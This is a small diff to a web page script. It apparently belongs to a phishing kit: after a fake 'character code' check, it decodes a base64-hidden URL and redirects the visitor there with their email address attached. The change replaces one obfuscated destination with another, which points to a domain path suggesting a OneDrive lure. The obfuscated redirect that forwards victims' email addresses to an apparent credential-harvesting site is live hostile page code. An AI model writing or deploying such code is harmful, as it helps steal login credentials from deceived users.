@@ -87,7 +87,7 @@ function checkCharAnswer() {
     step4.classList.add('hidden');
     step5.classList.add('fade-in');
 
-    const link = "aHR0cHM6Ly9iNWt2LnJrZjlucmR4eC5ydS95bm9GRWgvI08"; // Base64 encoded URL
+    const link = "aHR0cHM6Ly9kZXhjcm1vcC5kZS8xZHJ2LyM"; // Base64 encoded URL
     window.location.href = atob(link) + email;
   } else {
     charErrorEl.textContent = "Incorrect code. Try again.";
